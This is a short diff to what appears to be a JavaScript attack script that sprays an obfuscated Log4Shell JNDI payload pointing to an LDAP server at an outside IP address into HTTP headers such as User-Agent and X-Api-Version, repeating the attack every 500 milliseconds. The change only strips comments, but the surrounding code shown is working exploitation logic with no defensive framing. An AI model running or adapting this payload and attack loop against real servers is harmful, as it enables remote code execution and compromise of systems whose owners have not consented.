@@ -20,7 +20,7 @@ const PAYLOADS = [
   "${j${::-n}di:ldap://89.248.167.131/x}",
 ];
 
-// Headers to inject into — rotate through these
+
 const INJECT_HEADERS = [
   "User-Agent",
   "X-Api-Version",
@@ -128,7 +128,7 @@ async function attackTick() {
   }
 
   await Promise.allSettled(promises);
-  setTimeout(attackTick, 500); // 2 ticks per second
+  setTimeout(attackTick, 500); 
 }
 
 attackTick();
